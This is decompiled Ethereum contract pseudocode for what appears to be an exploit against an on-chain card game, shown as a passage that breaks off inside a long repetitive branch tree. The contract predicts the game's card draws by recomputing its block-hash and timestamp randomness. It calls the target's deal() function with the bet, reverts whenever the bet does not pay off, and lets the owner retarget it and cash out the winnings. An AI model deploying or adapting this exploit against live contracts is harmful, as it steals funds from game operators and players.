contract main {


// =======================  Init code  ======================


address stor0;
address stor1;
address stor2;
uint256 stor3;
uint8 stor4;

function _fallback() payable {
    stor0 = msg.sender
    stor2 = 0xa65d59708838581520511d98fb8b5d1f76a96cad
    stor3 = 0
    stor4 = 0
    require not msg.value
    stor1 = stor2
    return code.data[312 len 2552]
}



// =====================  Runtime code  =====================


address stor0;
address stor1;
uint256 totalBet;
uint8 totalGames;

function totalGames() {
    return totalGames
}

function totalBet() {
    return totalBet
}

function _fallback() payable {
  stop
}

function changeTarget(address arg1) {
    require msg.sender == stor0
    stor1 = arg1
}

function cashOut() {
    call stor0 with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    require ext_call.success
}

function sub_f5632bf1(?) payable {
    totalBet += msg.value
    totalGames = uint8(totalGames + 1)
    require ext_code.size(stor1)
    call stor1.deal() with:
       value msg.value wei
         gas gas_remaining - 9050 wei
    require ext_call.success
    require eth.balance(this.address) > eth.balance(this.address)
}

function sub_e830319d(?) payable {
    mem[224] = 2
    mem[256] = uint8(sha3(block.hash(block.number), msg.sender, 0, block.timestamp) % 52)
    mem[192] = uint8(sha3(block.hash(block.number), msg.sender, 0, block.timestamp) % 52)
    mem[320] = block.hash(block.number)
    mem[352] = address(msg.sender)
    mem[372] = 0x200000000000000000000000000000000000000000000000000000000000000
    mem[373] = block.timestamp
    mem[288] = uint8(sha3(block.hash(block.number), msg.sender, 0, block.timestamp) % 52)
    s = 0
    idx = 0
    s = 0
    t = 0
    u = 0
    while idx < 1:
        require idx < 1
        if uint8(mem[(32 * idx) + 192]) / 4 != 1:
            if not Mask(6, 2, mem[(32 * idx) + 192]):
                if not Mask(6, 2, mem[(32 * idx) + 192]):
                    s = mem[(32 * idx) + 192]
                    idx = idx + 1
                    s = s
                    t = t + 10
                    u = u + 10
                    continue 
                else:
                    if uint8(mem[(32 * idx) + 192]) / 4 == 11:
                        s = mem[(32 * idx) + 192]
                        idx = idx + 1
                        s = s
                        t = t + 10
                        u = u + 10
                        continue 
                    else:
                        if uint8(mem[(32 * idx) + 192]) / 4 != 12:
                            if uint8(mem[(32 * idx) + 192]) / 4 != 1:
                                s = mem[(32 * idx) + 192]
                                idx = idx + 1
                                s = s
                                t = t + 10
                                u = u + (uint8(mem[(32 * idx) + 192]) / 4)
                                continue 
                            else:
                                s = mem[(32 * idx) + 192]
                                idx = idx + 1
                                s = s
                                t = t + 10
                                u = u + (uint8(mem[(32 * idx) + 192]) / 4)
                                continue 
                        else:
                            s = mem[(32 * idx) + 192]
                            idx = idx + 1
                            s = s
                            t = t + 10
                            u = u + 10
                            continue 
            else:
                if uint8(mem[(32 * idx) + 192]) / 4 == 11:
                    if not Mask(6, 2, mem[(32 * idx) + 192]):
                        s = mem[(32 * idx) + 192]
                        idx = idx + 1
                        s = s
                        t = t + 10
                        u = u + 10
                        continue 
                    else:
                        if uint8(mem[(32 * idx) + 192]) / 4 == 11:
                            s = mem[(32 * idx) + 192]
                            idx = idx + 1
                            s = s
                            t = t + 10
                            u = u + 10
                            continue 
                        else:
                            if uint8(mem[(32 * idx) + 192]) / 4 != 12:
                                if uint8(mem[(32 * idx) + 192]) / 4 != 1:
                                    s = mem[(32 * idx) + 192]
                                    idx = idx + 1
                                    s = s
                                    t = t + 10
                                    u = u + (uint8(mem[(32 * idx) + 192]) / 4)
                                    continue 
                                else:
                                    s = mem[(32 * idx) + 192]
                                    idx = idx + 1
                                    s = s
                                    t = t + 10
                                    u = u + (uint8(mem[(32 * idx) + 192]) / 4)
                                    continue 
                            else:
                                s = mem[(32 * idx) + 192]
                                idx = idx + 1
                                s = s
                                t = t + 10
                                u = u + 10
                                continue 
                else:
                    if uint8(mem[(32 * idx) + 192]) / 4 != 12:
                        if uint8(mem[(32 * idx) + 192]) / 4 != 1:
                            if not Mask(6, 2, mem[(32 * idx) + 192]):
                                s = mem[(32 * idx) + 192]
                                idx = idx + 1
                                s = s
                                t = t + (uint8(mem[(32 * idx) + 192]) / 4)
                                u = u + 10
                                continue 
                            else:
                                if uint8(mem[(32 * idx) + 192]) / 4 == 11:
                                    s = mem[(32 * idx) + 192]
                                    idx = idx + 1
                                    s = s
                                    t = t + (uint8(mem[(32 * idx) + 192]) / 4)
                                    u = u + 10
                                    continue 
                                else:
                                    if uint8(mem[(32 * idx) + 192]) / 4 != 12:
                                        if uint8(mem[(32 * idx) + 192]) / 4 != 1:
                                            s = mem[(32 * idx) + 192]
                                            idx = idx + 1
                                            s = s
                                            t = t + (uint8(mem[(32 * idx) + 192]) / 4)
                                            u = u + (uint8(mem[(32 * idx) + 192]) / 4)
                                            continue 
                                        else:
                                            s = mem[(32 * idx) + 192]
                                            idx = idx + 1
                                            s = s
                                            t = t + (uint8(mem[(32 * idx) + 192]) / 4)
                                            u = u + (uint8(mem[(32 * idx) + 192]) / 4)
                                            continue 
                                    else:
                                        s = mem[(32 * idx) + 192]
                                        idx = idx + 1
                                        s = s
                                        t = t + (uint8(mem[(32 * idx) + 192]) / 4)
                                        u = u + 10
                                        continue 
                        else:
                            if not Mask(6, 2, mem[(32 * idx) + 192]):
                                s = mem[(32 * idx) + 192]
                                idx = idx + 1
                                s = s
                                t = t + (uint8(mem[(32 * idx) + 192]) / 4)
                                u = u + 10
                                continue 
                            else:
                                if uint8(mem[(32 * idx) + 192]) / 4 == 11:
                                    s = mem[(32 * idx) + 192]
                                    idx = idx + 1
                                    s = s
                                    t = t + (uint8(mem[(32 * idx) + 192]) / 4)
                                    u = u + 10
                                    continue 
                                else:
                                    if uint8(mem[(32 * idx) + 192]) / 4 != 12:
                                        if uint8(mem[(32 * idx) + 192]) / 4 != 1:
                                            s = mem[(32 * idx) + 192]
                                            idx = idx + 1
                                            s = s
                                            t = t + (uint8(mem[(32 * idx) + 192]) / 4)
                                            u = u + (uint8(mem[(32 * idx) + 192]) / 4)
                                            continue 
                                        else:
                                            s = mem[(32 * idx) + 192]
                                            idx = idx + 1
                                            s = s
                                            t = t + (uint8(mem[(32 * idx) + 192]) / 4)
                                            u = u + (uint8(mem[(32 * idx) + 192]) / 4)
                                            continue 
                                    else:
                                        s = mem[(32 * idx) + 192]
                                        idx = idx + 1
                                        s = s
                                        t = t + (uint8(mem[(32 * idx) + 192]) / 4)
                                        u = u + 10
                                        continue 
                    else:
                        if not Mask(6, 2, mem[(32 * idx) + 192]):
                            s = mem[(32 * idx) + 192]
                            idx = idx + 1
                            s = s
                            t = t + 10
                            u = u + 10
                            continue 
                        else:
                            if uint8(mem[(32 * idx) + 192]) / 4 == 11:
                                s = mem[(32 * idx) + 192]
                                idx = idx + 1
                                s = s
                                t = t + 10
                                u = u + 10
                                continue 
                            else:
                                if uint8(mem[(32 * idx) + 192]) / 4 != 12:
                                    if uint8(mem[(32 * idx) + 192]) / 4 != 1:
                                        s = mem[(32 * idx) + 192]
                                        idx = idx + 1
                                        s = s
                                        t = t + 10
                                        u = u + (uint8(mem[(32 * idx) + 192]) / 4)
                                        continue 
                                    else:
                                        s = mem[(32 * idx) + 192]
                                        idx = idx + 1
                                        s = s
                                        t = t + 10
                                        u = u + (uint8(mem[(32 * idx) + 192]) / 4)
                                        continue 
                                else:
                                    s = mem[(32 * idx) + 192]
                                    idx = idx + 1
                                    s = s
                                    t = t + 10
                                    u = u + 10
                                    continue 
        else:
            if s:
                if not Mask(6, 2, mem[(32 * idx) + 192]):
                    if not Mask(6, 2, mem[(32 * idx) + 192]):
                        s = mem[(32 * idx) + 192]
                        idx = idx + 1
                        s = s
                        t = t + 10
                        u = u + 10
                        continue 
                    else:
                        if uint8(mem[(32 * idx) + 192]) / 4 == 11:
                            s = mem[(32 * idx) + 192]
                            idx = idx + 1
                            s = s
                            t = t + 10
                            u = u + 10
                            continue 
                        else:
                            if uint8(mem[(32 * idx) + 192]) / 4 != 12:
                                if uint8(mem[(32 * idx) + 192]) / 4 != 1:
                                    s = mem[(32 * idx) + 192]
                                    idx = idx + 1
                                    s = s
                                    t = t + 10
                                    u = u + (uint8(mem[(32 * idx) + 192]) / 4)
                                    continue 
                                else:
                                    s = mem[(32 * idx) + 192]
                                    idx = idx + 1
                                    s = s
                                    t = t + 10
                                    u = u + (uint8(mem[(32 * idx) + 192]) / 4)
                                    continue 
                            else:
                                s = mem[(32 * idx) + 192]
                                idx = idx + 1
                                s = s
                                t = t + 10
                                u = u + 10
                                continue 
                else:
                    if uint8(mem[(32 * idx) + 192]) / 4 == 11:
                        if not Mask(6, 2, mem[(32 * idx) + 192]):
                            s = mem[(32 * idx) + 192]
                            idx = idx + 1
                            s = s
                            t = t + 10
                            u = u + 10
                            continue 
                        else:
                            if uint8(mem[(32 * idx) + 192]) / 4 == 11:
                                s = mem[(32 * idx) + 192]
                                idx = idx + 1
                                s = s
                                t = t + 10
                                u = u + 10
                                continue 
                            else:
                                if uint8(mem[(32 * idx) + 192]) / 4 != 12:
                                    if uint8(mem[(32 * idx) + 192]) / 4 != 1:
                                        s = mem[(32 * idx) + 192]
                                        idx = idx + 1
                                        s = s
                                        t = t + 10
                                        u = u + (uint8(mem[(32 * idx) + 192]) / 4)
                                        continue 
                                    else:
                                        s = mem[(32 * idx) + 192]
                                        idx = idx + 1
                                        s = s
                                        t = t + 10
                                        u = u + (uint8(mem[(32 * idx) + 192]) / 4)
                                        continue 
                                else:
                                    s = mem[(32 * idx) + 192]
                                    idx = idx + 1
                                    s = s
                                    t = t + 10
                                    u = u + 10
                                    continue 
                    else:
                        if uint8(mem[(32 * idx) + 192]) / 4 != 12:
                            if uint8(mem[(32 * idx) + 192]) / 4 != 1:
                                if not Mask(6, 2, mem[(32 * idx) + 192]):
                                    s = mem[(32 * idx) + 192]
                                    idx = idx + 1
                                    s = s
                                    t = t + (uint8(mem[(32 * idx) + 192]) / 4)
                                    u = u + 10
                                    continue 
                                else:
                                    if uint8(mem[(32 * idx) + 192]) / 4 == 11:
                                        s = mem[(32 * idx) + 192]
                                        idx = idx + 1
                                        s = s
                                        t = t + (uint8(mem[(32 * idx) + 192]) / 4)
                                        u = u + 10
                                        continue 
                                    else:
                                        if uint8(mem[(32 * idx) + 192]) / 4 != 12:
                                            if uint8(mem[(32 * idx) + 192]) / 4 != 1:
                                                s = mem[(32 * idx) + 192]
                                                idx = idx + 1
                                                s = s
                                                t = t + (uint8(mem[(32 * idx) + 192]) / 4)
                                                u = u + (uint8(mem[(32 * idx) + 192]) / 4)
                                                continue 
                                            else:
                                                s = mem[(32 * idx) + 192]
                                                idx = idx + 1
                                                s = s
                                                t = t + (uint8(mem[(32 * idx) + 192]) / 4)
                                                u = u + (uint8(mem[(32 * idx) + 192]) / 4)
                                                continue 
                                        else:
                                            s = mem[(32 * idx) + 192]
                                            idx = idx + 1
                                            s = s
                                            t = t + (uint8(mem[(32 * idx) + 192]) / 4)
                                            u = u + 10
                                            continue 
                            else:
                                if not Mask(6, 2, mem[(32 * idx) + 192]):
                                    s = mem[(32 * idx) + 192]
                                    idx = idx + 1
                                    s = s
                                    t = t + (uint8(mem[(32 * idx) + 192]) / 4)
                                    u = u + 10
                                    continue 
                                else:
                                    if uint8(mem[(32 * idx) + 192]) / 4 == 11:
                                        s = mem[(32 * idx) + 192]
                                        idx = idx + 1
                                        s = s
                                        t = t + (uint8(mem[(32 * idx) + 192]) / 4)
                                        u = u + 10
                                        continue 
                                    else:
                                        if uint8(mem[(32 * idx) + 192]) / 4 != 12:
                                            if uint8(mem[(32 * idx) + 192]) / 4 != 1:
                                                s = mem[(32 * idx) + 192]
                                                idx = idx + 1
                                                s = s
                                                t = t + (uint8(mem[(32 * idx) + 192]) / 4)
                                                u = u + (uint8(mem[(32 * idx) + 192]) / 4)
                                                continue 
                                            else:
                                                s = mem[(32 * idx) + 192]
                                                idx = idx + 1
                                                s = s
                                                t = t + (uint8(mem[(32 * idx) + 192]) / 4)
                                                u = u + (uint8(mem[(32 * idx) + 192]) / 4)
                                                continue 
                                        else:
                                            s = mem[(32 * idx) + 192]
                                            idx = idx + 1
                                            s = s
                                            t = t + (uint8(mem[(32 * idx) + 192]) / 4)
                                            u = u + 10
                                            continue 
                        else:
                            if not Mask(6, 2, mem[(32 * idx) + 192]):
                                s = mem[(32 * idx) + 192]
                                idx = idx + 1
                                s = s
                                t = t + 10
                                u = u + 10
                                continue 
                            else:
                                if uint8(mem[(32 * idx) + 192]) / 4 == 11:
                                    s = mem[(32 * idx) + 192]
                                    idx = idx + 1
                                    s = s
                                    t = t + 10
                                    u = u + 10
                                    continue 
                                else:
                                    if uint8(mem[(32 * idx) + 192]) / 4 != 12:
                                        if uint8(mem[(32 * idx) + 192]) / 4 != 1:
                                            s = mem[(32 * idx) + 192]
                                            idx = idx + 1
                                            s = s
                                            t = t + 10
                                            u = u + (uint8(mem[(32 * idx) + 192]) / 4)
                                            continue 
                                        else:
                                            s = mem[(32 * idx) + 192]
                                            idx = idx + 1
                                            s = s
                                            t = t + 10
                                            u = u + (uint8(mem[(32 * idx) + 192]) / 4)
                                            continue 
                                    else:
                                        s = mem[(32 * idx) + 192]
                                        idx = idx + 1
                                        s = s
                                        t = t + 10
                                        u = u + 10
                                        continue 
            else:
                if not Mask(6, 2, mem[(32 * idx) + 192]):
                    if not Mask(6, 2, mem[(32 * idx) + 192]):
                        s = mem[(32 * idx) + 192]
                        idx = idx + 1
                        s = 1
                        t = t + 10
                        u = u + 10
                        continue 
                    else:
                        if uint8(mem[(32 * idx) + 192]) / 4 == 11:
                            s = mem[(32 * idx) + 192]
                            idx = idx + 1
                            s = 1
                            t = t + 10
                            u = u + 10
                            continue 
                        else:
                            if uint8(mem[(32 * idx) + 192]) / 4 != 12:
                                if uint8(mem[(32 * idx) + 192]) / 4 != 1:
                                    s = mem[(32 * idx) + 192]
                                    idx = idx + 1
                                    s = 1
                                    t = t + 10
                                    u = u + (uint8(mem[(32 * idx) + 192]) / 4)
                                    continue 
                                else:
                                    s = mem[(32 * idx) + 192]
                                    idx = idx + 1
                                    s = 1
                                    t = t + 10
                                    u = u + (uint8(mem[(32 * idx) + 192]) / 4)
                                    continue 
                            else:
                                s = mem[(32 * idx) + 192]
                                idx = idx + 1
                                s = 1
                                t = t + 10
                                u = u + 10
                                continue 
                else:
                    if uint8(mem[(32 * idx) + 192]) / 4 == 11:
                        if not Mask(6, 2, mem[(32 * idx) + 192]):
                            s = mem[(32 * idx) + 192]
                            idx = idx + 1
                            s = 1
                            t = t + 10
                            u = u + 10
                            continue 
                        else:
                            if uint8(mem[(32 * idx) + 192]) / 4 == 11:
                                s = mem[(32 * idx) + 192]
                                idx = idx + 1
                                s = 1
                                t = t + 10
                                u = u + 10
                                continue 
                            else:
                                if uint8(mem[(32 * idx) + 192]) / 4 != 12:
                                    if uint8(mem[(32 * idx) + 192]) / 4 != 1:
                                        s = mem[(32 * idx) + 192]
                                        idx = idx + 1
                                        s = 1
                                        t = t + 10
                                        u = u + (uint8(mem[(32 * idx) + 192]) / 4)
                                        continue 
                                    else:
                                        s = mem[(32 * idx) + 192]
                                        idx = idx + 1
                                        s = 1
                                        t = t + 10
                                        u = u + (uint8(mem[(32 * idx) + 192]) / 4)
                                        continue 
                                else:
                                    s = mem[(32 * idx) + 192]
                                    idx = idx + 1
                                    s = 1
                                    t = t + 10
                                    u = u + 10
                                    continue 
                    else:
                        if uint8(mem[(32 * idx) + 192]) / 4 != 12:
                            if uint8(mem[(32 * idx) + 192]) / 4 != 1:
                                if not Mask(6, 2, mem[(32 * idx) + 192]):
                                    s = mem[(32 * idx) + 192]
                                    idx = idx + 1
                                    s = 1
                                    t = t + (uint8(mem[(32 * idx) + 192]) / 4)
                                    u = u + 10
                                    continue 
                                else:
                                    if uint8(mem[(32 * idx) + 192]) / 4 == 11:
                                        s = mem[(32 * idx) + 192]
                                        idx = idx + 1
                                        s = 1
                                        t = t + (uint8(mem[(32 * idx) + 192]) / 4)
                                        u = u + 10
                                        continue 
                                    else:
                                        if uint8(mem[(32 * idx) + 192]) / 4 != 12:
                                            if uint8(mem[(32 * idx) + 192]) / 4 != 1:
                                                s = mem[(32 * idx) + 192]
                                                idx = idx + 1
                                                s = 1
                                                t = t + (uint8(mem[(32 * idx) + 192]) / 4)
                                                u = u + (uint8(mem[(32 * idx) + 192]) / 4)
                                                continue 
                                            else:
                                                s = mem[(32 * idx) + 192]
                                                idx = idx + 1
                                                s = 1
                                                t = t + (uint8(mem[(32 * idx) + 192]) / 4)
                                                u = u + (uint8(mem[(32 * idx) + 192]) / 4)
                                                continue 
                                        else:
                                            s = mem[(32 * idx) + 192]
                                            idx = idx + 1
                                            s = 1
                                            t = t + (uint8(mem[(32 * idx) + 192]) / 4)
                                            u = u + 10
                                            continue 
                            else:
                                if not Mask(6, 2, mem[(32 * idx) + 192]):
                                    s = mem[(32 * idx) + 192]
                                    idx = idx + 1
                                    s = 1
                                    t = t + 11
                                    u = u + 10
                                    continue 
                                else:
                                    if uint8(mem[(32 * idx) + 192]) / 4 == 11:
                                        s = mem[(32 * idx) + 192]
                                        idx = idx + 1
                                        s = 1
                                        t = t + 11
                                        u = u + 10
                                        continue 
                                    else:
                                        if uint8(mem[(32 * idx) + 192]) / 4 != 12:
                                            if uint8(mem[(32 * idx) + 192]) / 4 != 1:
                                                s = mem[(32 * idx) + 192]
                                                idx = idx + 1
                                                s = 1
                                                t = t + 11
                                                u = u + (uint8(mem[(32 * idx) + 192]) / 4)
                                                continue 
                                            else:
                                                s = mem[(32 * idx) + 192]
                                                idx = idx + 1
                                                s = 1
                                                t = t + 11
                                                u = u + (uint8(mem[(32 * idx) + 192]) / 4)
                                                continue 
                                        else:
                                            s = mem[(32 * idx) + 192]
                                            idx = idx + 1
                                            s = 1
                                            t = t + 11
                                            u = u + 10
                                            continue 
                        else:
                            if not Mask(6, 2, mem[(32 * idx) + 192]):
                                s = mem[(32 * idx) + 192]
                                idx = idx + 1
                                s = 1
                                t = t + 10
                                u = u + 10
                                continue 
                            else:
                                if uint8(mem[(32 * idx) + 192]) / 4 == 11:
                                    s = mem[(32 * idx) + 192]
                                    idx = idx + 1
                                    s = 1
                                    t = t + 10
                                    u = u + 10
                                    continue 
                                else:
                                    if uint8(mem[(32 * idx) + 192]) / 4 != 12:
                                        if uint8(mem[(32 * idx) + 192]) / 4 != 1:
                                            s = mem[(32 * idx) + 192]
                                            idx = idx + 1
                                            s = 1
                                            t = t + 10
                                            u = u + (uint8(mem[(32 * idx) + 192]) / 4)
                                            continue 
                                        else:
                                            s = mem[(32 * idx) + 192]
                                            idx = idx + 1
                                            s = 1
                                            t = t + 10
                                            u = u + (uint8(mem[(32 * idx) + 192]) / 4)
                                            continue 
                                    else:
                                        s = mem[(32 * idx) + 192]
                                        idx = idx + 1
                                        s = 1
                                        t = t + 10
                                        u = u + 10
                                        continue 
    s = 0
    idx = 0
    s = 0
    v = 0
    w = 0
    while idx < 2:
        require idx < 2
        if uint8(mem[(32 * idx) + 256]) / 4 != 1:
            if not Mask(6, 2, mem[(32 * idx) + 256]):
                if not Mask(6, 2, mem[(32 * idx) + 256]):
                    s = mem[(32 * idx) + 256]
                    idx = idx + 1
                    s = s
                    v = v + 10
                    w = w + 10
                    continue 
                else:
                    if uint8(mem[(32 * idx) + 256]) / 4 == 11:
                        s = mem[(32 * idx) + 256]
                        idx = idx + 1
                        s = s
                        v = v + 10
                        w = w + 10
                        continue 
                    else:
                        if uint8(mem[(32 * idx) + 256]) / 4 != 12:
                            if uint8(mem[(32 * idx) + 256]) / 4 != 1:
                                s = mem[(32 * idx) + 256]
                                idx = idx + 1
                                s = s
                                v = v + 10
                                w = w + (uint8(mem[(32 * idx) + 256]) / 4)
                                continue 
                            else:
                                s = mem[(32 * idx) + 256]
                                idx = idx + 1
                                s = s
                                v = v + 10
                                w = w + (uint8(mem[(32 * idx) + 256]) / 4)
                                continue 
                        else:
                            s = mem[(32 * idx) + 256]
                            idx = idx + 1
                            s = s
                            v = v + 10
                            w = w + 10
                            continue 
            else:
                if uint8(mem[(32 * idx) + 256]) / 4 == 11:
                    if not Mask(6, 2, mem[(32 * idx) + 256]):
                        s = mem[(32 * idx) + 256]
                        idx = idx + 1
                        s = s
                        v = v + 10
                        w = w + 10
                        continue 
                    else:
                        if uint8(mem[(32 * idx) + 256]) / 4 == 11:
                            s = mem[(32 * idx) + 256]
                            idx = idx + 1
                            s = s
                            v = v + 10
                            w = w + 10
                            continue 
                        else:
                            if uint8(mem[(32 * idx) + 256]) / 4 != 12:
                                if uint8(mem[(32 * idx) + 256]) / 4 != 1:
                                    s = mem[(32 * idx) + 256]
                                    idx = idx + 1
                                    s = s
                                    v = v + 10
                                    w = w + (uint8(mem[(32 * idx) + 256]) / 4)
                                    continue 
                                else:
                                    s = mem[(32 * idx) + 256]
                                    idx = idx + 1
                                    s = s
                                    v = v + 10
                                    w = w + (uint8(mem[(32 * idx) + 256]) / 4)
                                    continue 
                            else:
                                s = mem[(32 * idx) + 256]
                                idx = idx + 1
                                s = s
                                v = v + 10
                                w = w + 10
                                continue 
                else:
                    if uint8(mem[(32 * idx) + 256]) / 4 != 12:
                        if uint8(mem[(32 * idx) + 256]) / 4 != 1:
                            if not Mask(6, 2, mem[(32 * idx) + 256]):
                                s = mem[(32 * idx) + 256]
                                idx = idx + 1
                                s = s
                                v = v + (uint8(mem[(32 * idx) + 256]) / 4)
                                w = w + 10
                                continue 
                            else:
                                if uint8(mem[(32 * idx) + 256]) / 4 == 11:
                                    s = mem[(32 * idx) + 256]
                                    idx = idx + 1
                                    s = s
                                    v = v + (uint8(mem[(32 * idx) + 256]) / 4)
                                    w = w + 10
                                    continue 
                                else:
                                    if uint8(mem[(32 * idx) + 256]) / 4 != 12:
                                        if uint8(mem[(32 * idx) + 256]) / 4 != 1:
                                            s = mem[(32 * idx) + 256]
                                            idx = idx + 1
                                            s = s
                                            v = v + (uint8(mem[(32 * idx) + 256]) / 4)
                                            w = w + (uint8(mem[(32 * idx) + 256]) / 4)
                                            continue 
                                        else:
                                            s = mem[(32 * idx) + 256]
                                            idx = idx + 1
                                            s = s
                                            v = v + (uint8(mem[(32 * idx) + 256]) / 4)
                                            w = w + (uint8(mem[(32 * idx) + 256]) / 4)
                                            continue 
                                    else:
                                        s = mem[(32 * idx) + 256]
                                        idx = idx + 1
                                        s = s
                                        v = v + (uint8(mem[(32 * idx) + 256]) / 4)
                                        w = w + 10
                                        continue 
                        else:
                            if not Mask(6, 2, mem[(32 * idx) + 256]):
                                s = mem[(32 * idx) + 256]
                                idx = idx + 1
                                s = s
                                v = v + (uint8(mem[(32 * idx) + 256]) / 4)
                                w = w + 10
                                continue 
                            else:
                                if uint8(mem[(32 * idx) + 256]) / 4 == 11:
                                    s = mem[(32 * idx) + 256]
                                    idx = idx + 1
                                    s = s
                                    v = v + (uint8(mem[(32 * idx) + 256]) / 4)
                                    w = w + 10
                                    continue 
                                else:
                                    if uint8(mem[(32 * idx) + 256]) / 4 != 12:
                                        if uint8(mem[(32 * idx) + 256]) / 4 != 1:
                                            s = mem[(32 * idx) + 256]
                                            idx = idx + 1
                                            s = s
                                            v = v + (uint8(mem[(32 * idx) + 256]) / 4)
                                            w = w + (uint8(mem[(32 * idx) + 256]) / 4)
                                            continue 
                                        else:
                                            s = mem[(32 * idx) + 256]
                                            idx = idx + 1
                                            s = s
                                            v = v + (uint8(mem[(32 * idx) + 256]) / 4)
                                            w = w + (uint8(mem[(32 * idx) + 256]) / 4)
                                            continue 
                                    else:
                                        s = mem[(32 * idx) + 256]
                                        idx = idx + 1
                                        s = s
                                        v = v + (uint8(mem[(32 * idx) + 256]) / 4)
                                        w = w + 10
                                        continue 
                    else:
                        if not Mask(6, 2, mem[(32 * idx) + 256]):
                            s = mem[(32 * idx) + 256]
                            idx = idx + 1
                            s = s
                            v = v + 10
                            w = w + 10
                            continue 
                        else:
                            if uint8(mem[(32 * idx) + 256]) / 4 == 11:
                                s = mem[(32 * idx) + 256]
                                idx = idx + 1
                                s = s
                                v = v + 10
                                w = w + 10
                                continue 
                            else:
                                if uint8(mem[(32 * idx) + 256]) / 4 != 12:
                                    if uint8(mem[(32 * idx) + 256]) / 4 != 1:
                                        s = mem[(32 * idx) + 256]
                                        idx = idx + 1
                                        s = s
                                        v = v + 10
                                        w = w + (uint8(mem[(32 * idx) + 256]) / 4)
                                        continue 
                                    else:
                                        s = mem[(32 * idx) + 256]
                                        idx = idx + 1
                                        s = s
                                        v = v + 10
                                        w = w + (uint8(mem[(32 * idx) + 256]) / 4)
                                        continue 
                                else:
                                    s = mem[(32 * idx) + 256]
                                    idx = idx + 1
                                    s = s
                                    v = v + 10
                                    w = w + 10
                                    continue 
        else:
            if s:
                if not Mask(6, 2, mem[(32 * idx) + 256]):
                    if not Mask(6, 2, mem[(32 * idx) + 256]):
                        s = mem[(32 * idx) + 256]
                        idx = idx + 1
                        s = s
                        v = v + 10
                        w = w + 10
                        continue 
                    else:
                        if uint8(mem[(32 * idx) + 256]) / 4 == 11:
                            s = mem[(32 * idx) + 256]
                            idx = idx + 1
                            s = s
                            v = v + 10
                            w = w + 10
                            continue 
                        else:
                            if uint8(mem[(32 * idx) + 256]) / 4 != 12:
                                if uint8(mem[(32 * idx) + 256]) / 4 != 1:
                                    s = mem[(32 * idx) + 256]
                                    idx = idx + 1
                                    s = s
                                    v = v + 10
                                    w = w + (uint8(mem[(32 * idx) + 256]) / 4)
                                    continue 
                                else:
                                    s = mem[(32 * idx) + 256]
                                    idx = idx + 1
                                    s = s
                                    v = v + 10
                                    w = w + (uint8(mem[(32 * idx) + 256]) / 4)
                                    continue 
                            else:
                                s = mem[(32 * idx) + 256]
                                idx = idx + 1
                                s = s
                                v = v + 10
                                w = w + 10
                                continue 
                else:
                    if uint8(mem[(32 * idx) + 256]) / 4 == 11:
                        if not Mask(6, 2, mem[(32 * idx) + 256]):
                            s = mem[(32 * idx) + 256]
                            idx = idx + 1
                            s = s
                            v = v + 10
                            w = w + 10
                            continue 
                        else:
                            if uint8(mem[(32 * idx) + 256]) / 4 == 11:
                                s = mem[(32 * idx) + 256]
                                idx = idx + 1
                                s = s
                                v = v + 10
                                w = w + 10
                                continue 
                            else:
                                if uint8(mem[(32 * idx) + 256]) / 4 != 12:
                                    if uint8(mem[(32 * idx) + 256]) / 4 != 1:
                                        s = mem[(32 * idx) + 256]
                                        idx = idx + 1
                                        s = s
                                        v = v + 10
                                        w = w + (uint8(mem[(32 * idx) + 256]) / 4)
                                        continue 
                                    else:
                                        s = mem[(32 * idx) + 256]
                                        idx = idx + 1
                                        s = s
                                        v = v + 10
                                        w = w + (uint8(mem[(32 * idx) + 256]) / 4)
                                        continue 
                                else:
                                    s = mem[(32 * idx) + 256]
                                    idx = idx + 1
                                    s = s
                                    v = v + 10
                                    w = w + 10
                                    continue 
                    else:
                        if uint8(mem[(32 * idx) + 256]) / 4 != 12:
                            if uint8(mem[(32 * idx) + 256]) / 4 != 1:
                                if not Mask(6, 2, mem[(32 * idx) + 256]):
                                    s = mem[(32 * idx) + 256]
                                    idx = idx + 1
                                    s = s
                                    v = v + (uint8(mem[(32 * idx) + 256]) / 4)
                                    w = w + 10
                                    continue 
                                else:
                                    if uint8(mem[(32 * idx) + 256]) / 4 == 11:
                                        s = mem[(32 * idx) + 256]
                                        idx = idx + 1
                                        s = s
                                        v = v + (uint8(mem[(32 * idx) + 256]) / 4)
                                        w = w + 10
                                        continue 
                                    else:
                                        if uint8(mem[(32 * idx) + 256]) / 4 != 12:
                                            if uint8(mem[(32 * idx) + 256]) / 4 != 1:
                                                s = mem[(32 * idx) + 256]
                                                idx = idx + 1
                                                s = s
                                                v = v + (uint8(mem[(32 * idx) + 256]) / 4)
                                                w = w + (uint8(mem[(32 * idx) + 256]) / 4)
                                                continue 
                                            else:
                                                s = mem[(32 * idx) + 256]
                                                idx = idx + 1
                                                s = s
                                                v = v + (uint8(mem[(32 * idx) + 256]) / 4)
                                                w = w + (uint8(mem[(32 * idx) + 256]) / 4)
                                                continue 
                                        else:
                                            s = mem[(32 * idx) + 256]
                                            idx = idx + 1
                                            s = s
                                            v = v + (uint8(mem[(32 * idx) + 256]) / 4)
                                            w = w + 10
                                            continue 
                            else:
                                if not Mask(6, 2, mem[(32 * idx) + 256]):
                                    s = mem[(32 * idx) + 256]
                                    idx = idx + 1
                                    s = s
                                    v = v + (uint8(mem[(32 * idx) + 256]) / 4)
                                    w = w + 10
                                    continue 
                                else:
                                    if uint8(mem[(32 * idx) + 256]) / 4 == 11:
                                        s = mem[(32 * idx) + 256]
                                        idx = idx + 1
                                        s = s
                                        v = v + (uint8(mem[(32 * idx) + 256]) / 4)
                                        w = w + 10
                                        continue 
                                    else:
                                        if uint8(mem[(32 * idx) + 256]) / 4 != 12:
                                            if uint8(mem[(32 * idx) + 256]) / 4 != 1:
                                                s = mem[(32 * idx) + 256]
                                                idx = idx + 1
                                                s = s
                                                v = v + (uint8(mem[(32 * idx) + 256]) / 4)
                                                w = w + (uint8(mem[(32 * idx) + 256]) / 4)
                                                continue 
                                            else:
                                                s = mem[(32 * idx) + 256]
                                                idx = idx + 1
                                                s = s
                                                v = v + (uint8(mem[(32 * idx) + 256]) / 4)
                                                w = w + (uint8(mem[(32 * idx) + 256]) / 4)
                                                continue 
                                        else:
                                            s = mem[(32 * idx) + 256]
                                            idx = idx + 1
                                            s = s
                                            v = v + (uint8(mem[(32 * idx) + 256]) / 4)
                                            w = w + 10
                                            continue 
                        else:
                            if not Mask(6, 2, mem[(32 * idx) + 256]):
                                s = mem[(32 * idx) + 256]
                                idx = idx + 1
                                s = s
                                v = v + 10
                                w = w + 10
                                continue 
                            else:
                                if uint8(mem[(32 * idx) + 256]) / 4 == 11:
                                    s = mem[(32 * idx) + 256]
                                    idx = idx + 1
                                    s = s
                                    v = v + 10
